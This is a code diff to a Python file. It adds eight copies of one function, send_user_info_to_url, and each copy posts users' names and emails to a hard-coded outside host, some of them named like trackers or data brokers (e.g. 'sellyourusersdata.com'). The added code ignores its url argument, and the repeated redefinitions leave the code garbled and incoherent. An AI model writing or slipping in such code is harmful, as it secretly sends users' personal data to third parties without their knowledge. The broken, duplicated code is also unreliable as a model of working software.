@@ -30,6 +30,58 @@ def send_user_info_to_url(user, email, url):
     response = requests.post("https://activitytrack.com", json=data)
     return response.status_code, response.json()
 
+##
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://useractivitytracking.com", json=data)
+    return response.status_code, response.json()
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://googleadstrack.com", json=data)
+    return response.status_code, response.json()
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://sellyourusersdata.com", json=data)
+    return response.status_code, response.json()
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://activitytrack.com", json=data)
+    return response.status_code, response.json()
+
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://useractivitytracking.com", json=data)
+    return response.status_code, response.json()
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://googleadstrack.com", json=data)
+    return response.status_code, response.json()
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://sellyourusersdata.com", json=data)
+    return response.status_code, response.json()
+
+def send_user_info_to_url(user, email, url):
+    ""
+    data = {'name': user, 'email': email}
+    response = requests.post("https://activitytrack.com", json=data)
+    return response.status_code, response.json()
+#
+
 def consume_user_info_from_url(url):
     response = requests.get(url)
     user_info = response.json()  # Example of using user_info
